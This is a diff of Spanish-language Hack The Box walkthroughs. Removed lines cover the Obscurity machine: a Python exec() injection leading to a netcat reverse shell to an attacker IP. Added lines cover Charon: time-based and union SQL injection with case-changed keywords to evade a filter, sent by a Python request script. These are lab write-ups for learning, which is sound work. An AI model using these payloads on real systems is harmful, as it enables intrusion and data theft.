 Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
-Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.74 seconds
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.42 seconds
 </code></pre></div></div>
 
-<p>Vemos el puerto 8080 asociado al servicio HTTP, por lo tanto, antes de abrir el navegador, vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+<p>Vemos el puerto 80 abierto, así que comos simpre vamos a ver a lo que nos enfrentamos con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> antes de ver su contenido vía web.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.168:8080/
-http://10.10.10.168:8080/ <span class="o">[</span>200 OK] Bootstrap, Country[RESERVED][ZZ], Email[secure@obscure.htb], HTML5, HTTPServer[BadHTTPServer], IP[10.10.10.168], JQuery, Script, Title[0bscura], X-UA-Compatible[IE<span class="o">=</span>Edge]
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.31/
+http://10.10.10.31/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.31], PoweredBy[:], Script[text/javascript], Title[Frozen Yogurt Shop]
 </code></pre></div></div>
 
-<p>Vemos una dirección de correo electrónico <strong>secure@obscure.htb</strong>, por lo que podríamos estar pensando en que se está aplicando <strong><em>Virtual Hosting</em></strong>; pero antes de ver agregar el dominio a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, vamos a echarle un ojo:</p>
+<p>No vemos nada interesante, asi que ahora si vamos a valir vía web.</p>
 
-<p><img src="/assets/images/htb-obscurity/obscurity-web.png" alt="" /></p>
+<p><img src="/assets/images/htb-charon/charon-web.png" alt="" /></p>
 
-<p>Algo que debemos de notar, es al final del sitio web, nos dicen que existe un directorio secreto en donde se encuentra un script en python llamado <strong>SuperSecureServer.py</strong> (podríamos agregar el dominio al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y lo único que cambia son que se pueden visualizar mejor unos iconos).</p>
+<p>Analizando un poco el sitio web, vemos que tenemos las opciones <strong>HOME</strong>, <strong>ABOUT</strong> y <strong>BLOG</strong>. Dentro de <strong>BLOG</strong> tenemos algunas opciones que si seleccionamos, tenemos en la dirección URL el parámetro <code class="language-plaintext highlighter-rouge">id</code>.</p>
 
-<p><img src="/assets/images/htb-obscurity/obscurity-web1.png" alt="" /></p>
+<p><img src="/assets/images/htb-charon/charon-web1.png" alt="" /></p>
 
-<p>De acuerdo con lo que nos indican, vamos a tratar de descubrir un directorio que contenga el archivo <strong>SuperSecureServer.py</strong> mediante el uso de <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+<p><img src="/assets/images/htb-charon/charon-web2.png" alt="" /></p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>367 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+<p>Si cambianos el valor del <code class="language-plaintext highlighter-rouge">id</code>, tenemos que cambia lo que visualizamos vía web y para este caso, sólo tenemos las opciones 10, 11 y 12; para las demás opciones, el texto desaparece. Por lo tanto, podríamos pensar en realizar una inyección SQL (<strong><em>SQLi</em></strong>):</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10'-- -</code> No vemos nada.</li>
+  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10' order by 100-- -</code> No se nos visualiza nada.</li>
+  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10 and sleep(5)-- -</code> Vemos que el navegador tarda 5 segundos en responder, por lo tanto el sitio es vulnerabla a ataques de tipo SQLi basado en tiempo.</li>
+</ul>
+
+<p>Como vemos que el recurso es vulnerable a SQLi basado en tiempo. Pensando un poco, podríamos intuir que existen algún gestor de contenido o un panel de login debido a que por detrar está presenta una base de datos. Asi que vamos a tratar de descubrir rutas dentro del servidor web.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>191 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/FUZZ
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+Target: http://10.10.10.31/FUZZ
 Total requests: 220560
 
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                         
 =====================================================================
 
-000004535:   200        170 L    498 W      5892 Ch     "develop"                                                       
+000000016:   403        11 L     32 W       293 Ch      "images"                                                        
+000000550:   403        11 L     32 W       290 Ch      "css"                                                           
+000000953:   403        11 L     32 W       289 Ch      "js"                                                            
+000001112:   403        11 L     32 W       294 Ch      "include"                                                       
+000002771:   403        11 L     32 W       292 Ch      "fonts"                                                         
+000047682:   403        11 L     32 W       294 Ch      "cmsdata"                                                       
 ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
-Total time: 63.47655
-Processed Requests: 5873
-Filtered Requests: 5872
-Requests/sec.: 92.52235
+Total time: 112.0082
+Processed Requests: 61385
+Filtered Requests: 61379
+Requests/sec.: 548.0399
 </span></code></pre></div></div>
 
-<p>Tenemos el directorio <code class="language-plaintext highlighter-rouge">/develop</code>, asi que vamos a echarle un ojo.</p>
+<p>Vemos un recurso intersante llamado <code class="language-plaintext highlighter-rouge">cmsdata</code>; sin embargo, tiene un código de estado 403 (Forbidden). Pensando un poco, es posible que podamos obtener recursos dentro de ese directorio que nos regrese un código de estado 200. Así que lo primero que haremos, es buscar archivos de extensión php.</p>
 
-<p><img src="/assets/images/htb-obscurity/obscurity-web2.png" alt="" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>32 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/cmsdata/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
 
-<p>Tenemos un programa en python y podemos visualizar el código, por lo que vamos a pasarlo a nuestro equipo para analizarlo.</p>
+Target: http://10.10.10.31/cmsdata/FUZZ.php
+Total requests: 220560
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://10.10.10.168:8080/develop/SuperSecureServer.py
-<span class="nt">--2022-01-05</span> 22:42:02--  http://10.10.10.168:8080/develop/SuperSecureServer.py
-Conectando con 10.10.10.168:8080... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 5892 <span class="o">(</span>5.8K<span class="o">)</span> <span class="o">[</span>text/plain]
-Grabando a: «SuperSecureServer.py»
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
 
-SuperSecureServer.py             100%[<span class="o">=======================================================&gt;]</span>   5.75K  <span class="nt">--</span>.-KB/s    en 0s      
+000000282:   200        97 L     606 W      6426 Ch     "menu"                                                          
+000000366:   200        97 L     606 W      6426 Ch     "upload"                                                        
+000000053:   200        97 L     606 W      6426 Ch     "login"                                                         
+000001706:   200        96 L     596 W      6322 Ch     "forgot"                                                        
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
-2022-01-05 22:42:02 <span class="o">(</span>273 MB/s<span class="o">)</span> - «SuperSecureServer.py» guardado <span class="o">[</span>5892/5892]
-</code></pre></div></div>
-
-<p>Primero, vamos a tratar de buscar palabras claves que nos ayuden a ejecutar comandos a nivel de sistema, como <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exec</code>; entre otros.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>SuperSecureServer.py | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s2">"system|exec"</span>
-            <span class="nb">exec</span><span class="o">(</span>info.format<span class="o">(</span>path<span class="o">))</span> <span class="c"># This is how you do string formatting, right?</span>
-</code></pre></div></div>
-
-<p>Vemos la línea <code class="language-plaintext highlighter-rouge">exec(info.format(path))</code>; pero no sabemos el valor de <code class="language-plaintext highlighter-rouge">path</code>; sin embargo, la línea anterior <code class="language-plaintext highlighter-rouge">info = "output = 'Document: {}'"</code> se observa que la variable info regresa un valor <code class="language-plaintext highlighter-rouge">Document:</code>, y si consultamos un recurso innexistente en el servidor web, tenemos lo siguiente:</p>
-
-<p><img src="/assets/images/htb-obscurity/obscurity-web3.png" alt="" /></p>
-
-<p>Aqui podemos pensar que el script gestiona las consultas hacia el servidor y lo hace validando recursos a nivel de sistema mediante el comando <code class="language-plaintext highlighter-rouge">exec</code>. Por lo tanto podríamos tratar de encontrar una forma que nos permita ejecutar comandos a nivel de sistema a través de dicho script; asi que primero vamos a importar la librería <code class="language-plaintext highlighter-rouge">pdb</code> para hacer debugin y agregaremos el inicio del programa.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>                                                   
-<span class="kn">import</span> <span class="nn">threading</span>                                                
-<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>                                   
-<span class="kn">import</span> <span class="nn">sys</span>                                                      
-<span class="kn">import</span> <span class="nn">os</span>                   
-<span class="kn">import</span> <span class="nn">mimetypes</span>                                                                                                                 
-<span class="kn">import</span> <span class="nn">urllib.parse</span>                                             
-<span class="kn">import</span> <span class="nn">subprocess</span>                                                                                                                
-<span class="kn">import</span> <span class="nn">pdb</span> <span class="c1"># Nos permite hacer debugin
-</span><span class="o">...</span>
-    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
-        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
-</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
-</span>            <span class="n">pdb</span><span class="o">.</span><span class="n">set_trace</span><span class="p">()</span> <span class="c1"># Ponemos un break point
-</span><span class="o">...</span>
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span> <span class="c1"># Hacemos que el flujo del programa empiece por aquí montando un servidor local en nuestro equipo
-</span>    <span class="n">ws</span> <span class="o">=</span> <span class="n">Server</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span> 
-    <span class="n">ws</span><span class="o">.</span><span class="n">listen</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>Vamos a ejecutar el programa y consultar cualquier recurso en nuestro navegador sobre <code class="language-plaintext highlighter-rouge">localhost</code>.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 SuperSecureServer.py
-<span class="o">&gt;</span> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>142<span class="o">)</span>serveDoc<span class="o">()</span>
--&gt; cwd <span class="o">=</span> os.path.dirname<span class="o">(</span>os.path.realpath<span class="o">(</span>__file__<span class="o">))</span>
-<span class="o">(</span>Pdb<span class="o">)</span> 
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/test
-</code></pre></div></div>
-
-<p>A continuación vamos a listan algunos comandos a utilizar para debugear:</p>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">where</code> - Nos indica en donde nos encontramos, en donde se realiza el break point. Para este caso, estamos en el punto antes de ejecutar la linea <code class="language-plaintext highlighter-rouge">cwd = os.path.dirname(os.path.realpath(__file__))</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>Pdb<span class="o">)</span> where
-  /usr/lib/python3.9/threading.py<span class="o">(</span>912<span class="o">)</span>_bootstrap<span class="o">()</span>
--&gt; self._bootstrap_inner<span class="o">()</span>
-  /usr/lib/python3.9/threading.py<span class="o">(</span>954<span class="o">)</span>_bootstrap_inner<span class="o">()</span>
--&gt; self.run<span class="o">()</span>
-  /usr/lib/python3.9/threading.py<span class="o">(</span>892<span class="o">)</span>run<span class="o">()</span>
--&gt; self._target<span class="o">(</span><span class="k">*</span>self._args, <span class="k">**</span>self._kwargs<span class="o">)</span>
-  /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>90<span class="o">)</span>listenToClient<span class="o">()</span>
--&gt; self.handleRequest<span class="o">(</span>req, client, address<span class="o">)</span>
-  /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>106<span class="o">)</span>handleRequest<span class="o">()</span>
--&gt; document <span class="o">=</span> self.serveDoc<span class="o">(</span>request.doc, DOC_ROOT<span class="o">)</span>
-<span class="o">&gt;</span> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>142<span class="o">)</span>serveDoc<span class="o">()</span>
--&gt; cwd <span class="o">=</span> os.path.dirname<span class="o">(</span>os.path.realpath<span class="o">(</span>__file__<span class="o">))</span>
-<span class="o">(</span>Pdb<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">p variable</code> - Obtenemos el valor de la variable. Para este caso vamos a checar el valor de las variables <code class="language-plaintext highlighter-rouge">path</code> e <code class="language-plaintext highlighter-rouge">info</code> . Si observamos un poco, el valor de la variable info se encuentra entre comillas simples; esto es importante ya que podríamos tratar de cerrar las comillas simples e insertar comandos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>Pdb<span class="o">)</span> p path
-<span class="s1">'/test'</span>
-<span class="o">(</span>Pdb<span class="o">)</span> p info
-<span class="s2">"output = 'Document: {}'"</span>
-<span class="o">(</span>Pdb<span class="o">)</span> p info.format<span class="o">(</span>path<span class="o">)</span>
-<span class="s2">"output = 'Document: /test'"</span>
-<span class="o">(</span>Pdb<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">variable = </code> - Cambiamos el valor de una variable. Esto lo realizaremos con el fin de ver que valor dentro del <code class="language-plaintext highlighter-rouge">path</code> nos pueden ayudar a ejecutar comando a nivel de sistema mediante la expresión <code class="language-plaintext highlighter-rouge">import os; os.system('whoami')</code>. Debido a que podriamos tener algunos problemas debido a la comillas simples y dobles, vamos a ejecutar el script y desde la ventana del explorador vamos a insertar el código.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">http://localhost/';os.system("whoami")'</code> - Observamos de respuesta <code class="language-plaintext highlighter-rouge">invalid syntax (&lt;string&gt;, line 1)</code>.</li>
-      <li><code class="language-plaintext highlighter-rouge">http://localhost/";os.system('whoami')"</code> - Observamos de respuesta <code class="language-plaintext highlighter-rouge">invalid syntax (&lt;string&gt;, line 1)</code>.</li>
-      <li><code class="language-plaintext highlighter-rouge">http://localhost/;os.system("whoami")</code> - El programa se ejecuta de manera normal y se detiene en donde se presenta el break point. Sin embargo, no vemos el resultado del comando.</li>
-      <li><code class="language-plaintext highlighter-rouge">http://localhost/';os.system("whoami");'</code> - El programa se ejecuta de manera normal y se detiene en donde se presenta el break point y podemos ver el resultado de ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code>. Esto se debe a que estamos escapando (<code class="language-plaintext highlighter-rouge">\'</code>) las comillas simples y nuestro código ya no es tratado como texto, si no como comandos ejecutados a nivel de sistema.</li>
-    </ul>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 SuperSecureServer.py
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-invalid syntax <span class="o">(</span>&lt;string&gt;, line 1<span class="o">)</span>
-<span class="o">&gt;</span> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>142<span class="o">)</span>serveDoc<span class="o">()</span>
--&gt; cwd <span class="o">=</span> os.path.dirname<span class="o">(</span>os.path.realpath<span class="o">(</span>__file__<span class="o">))</span>
-<span class="o">(</span>Pdb<span class="o">)</span> root
-<span class="o">&gt;</span> /home/k4miyo/Documentos/HTB/Obscurity/content/SuperSecureServer.py<span class="o">(</span>142<span class="o">)</span>serveDoc<span class="o">()</span>
--&gt; cwd <span class="o">=</span> os.path.dirname<span class="o">(</span>os.path.realpath<span class="o">(</span>__file__<span class="o">))</span>
-<span class="o">(</span>Pdb<span class="o">)</span> p path
-<span class="s1">'/\'</span><span class="p">;</span>os.system<span class="o">(</span><span class="s2">"whoami"</span><span class="o">)</span><span class="p">;</span><span class="se">\'</span><span class="s1">'
-(Pdb) p info.format(path)
-'</span>output <span class="o">=</span> <span class="se">\'</span>Document: /<span class="se">\'</span><span class="p">;</span>os.system<span class="o">(</span><span class="s2">"whoami"</span><span class="o">)</span><span class="p">;</span><span class="se">\'\'</span><span class="s1">'
-(Pdb) 
+Total time: 0
+Processed Requests: 7160
+Filtered Requests: 7156
+Requests/sec.: 0
 </span></code></pre></div></div>
 
-<p>Ya logramos obtener la sintaxis para realizar ejecución de comandos, si ejecutamos lo mismo en la máquina víctima no debemos el resultado del comando; pero como el principio es el mismo y que es posible que vía web no se nos liste los resultados, vamos a tratar de mandar un ping hacia nuestra máquina para validar.</p>
+<p>Aqui ya tenemos unos archivos que ya debería de llamarnos la atención sería <code class="language-plaintext highlighter-rouge">login.php</code>; asi que vamos a echarle un ojo.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.168:8080/<span class="s1">';os.system("ping -c 1 10.10.14.27");'</span>
+<p><img src="/assets/images/htb-charon/charon-web3.png" alt="" /></p>
+
+<p>Podríamos tratar de ingresar credenciales default o típicas; sin embargo, no vamos a conseguir nada. Como sabemos que el sitio es vulnerable a ataques de SQLi, vamos a tratar de inyectar algunos comandos. Para el panel de login no logramos nada; pero si intentamos sobre el recurso <code class="language-plaintext highlighter-rouge">forgot.php</code>, vemos que se nos muestra una leyenda <strong>Incorrect format</strong></p>
+
+<p><img src="/assets/images/htb-charon/charon-web4.png" alt="" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">' order by 100-- -</code> - Incorrect format</li>
+  <li><code class="language-plaintext highlighter-rouge">test@test.com' order by 100-- -</code> - Error in Database!</li>
+</ul>
+
+<p>Con la inyección anterior, vemos un resultado diferente.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web5.png" alt="" /></p>
+
+<p>Para trabajar de una forma más cómoda y poder realizar pruebas, vamos a generar un script en python que nos permita realizar las consultas que necesitemos.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding:utf-8
+</span>
+<span class="kn">import</span> <span class="nn">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">re</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="c1"># Variables globales
+</span><span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.31/cmsdata/forgot.php"</span>
+
+<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">sqli_data</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">"email"</span> <span class="p">:</span> <span class="s">"</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqli_data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'h2.*'</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Ha ocurrido un error!"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">sqli_data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Email: "</span><span class="p">)</span>
+        <span class="n">makeRequest</span><span class="p">(</span><span class="n">sqli_data</span><span class="p">)</span>
+
+
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tcpdump <span class="nt">-i</span> tun0 icmp
-tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
-listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length 262144 bytes
-19:08:12.044640 IP obscure.htb <span class="o">&gt;</span> 10.10.14.27: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1937, <span class="nb">seq </span>1, length 64
-19:08:12.044747 IP 10.10.14.27 <span class="o">&gt;</span> obscure.htb: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>1937, <span class="nb">seq </span>1, length 64
+<p>Una vez que tenemos nuestro script, vamos a realizar algunas pruebas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
+Email: <span class="nb">test</span>@test.com<span class="s1">' order by 100-- -
+[*] Error in Database!    
+Email: test@test.com'</span> order by 10-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
+Email: <span class="nb">test</span>@test.com<span class="s1">' order by 9-- -
+[*] Error in Database!    
+Email: test@test.com'</span> order by 7-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
+Email: <span class="nb">test</span>@test.com<span class="s1">' order by 5-- -
+[*] Error in Database!    
+Email: test@test.com'</span> order by 4-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User not found with that email!    
+Email:
 </code></pre></div></div>
 
-<p>Ahora nos entablamos una reverse shell, así que nos ponemos en escucha por el puerto 443:</p>
+<p>Para el valor 4, vemos que la respuesta cambia de <strong>Error in Database</strong> a <strong>User not found with that email!</strong>; por lo tanto podríamos pensar que la tabla de la base de datos presenta 4 columnas.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.168:8080/<span class="s1">';os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f");'</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' union select 1,2,3,4-- -
+[-] Ha ocurrido un error!
+Email:
+</span></code></pre></div></div>
+
+<p>Cuando queremos ejecutar la sentencia <code class="language-plaintext highlighter-rouge">union select</code>, vemos que ocurre un error; por lo tanto vamos a ocupar un tipo de evasión ya que se observa que hay palabras o caracteres que al servidor no le gusta.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,4-- -
+[*] Incorrect format    
+Email:
+</span></code></pre></div></div>
+
+<p>Vemos que al cambiar unas letras a mayúsculas, ya le gusta al servidor; sin embargo, ya no tenemos la respuesta de <strong>User not found with that email!</strong>; por lo que podrían existir caracteres que no le gustan, pero antes de listar con todas las letras del abecedario, vamos a tratar primero los caracteres especiales.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,"a"-- -
+[*] Error in Database!    
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,<span class="s2">"b"</span><span class="nt">--</span> -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,"c"-- -
+[*] Error in Database!    
+Email:  
+</span></code></pre></div></div>
+
+<p>Para hacer un barrido sobre los caracteres especiales, hacremos uso del archivo <code class="language-plaintext highlighter-rouge">/opt/SecLists/Fuzzing/special-chars.txt</code> (que en caso de no tenerlo, podemos descargar <a href="https://github.com/danielmiessler/SecLists">SecLists</a> y lo guardamos en <code class="language-plaintext highlighter-rouge">/opt/</code>). Como la respuesta no es la que buscamos, vamos a tratar de hacer combinaciones de caracteres especiales. Pero para este caso vamos a utilizar la herramienta <a href="https://portswigger.net/burp">BurpSuite</a></p>
+
+<p><img src="/assets/images/htb-charon/charon-burp.png" alt="" /></p>
+
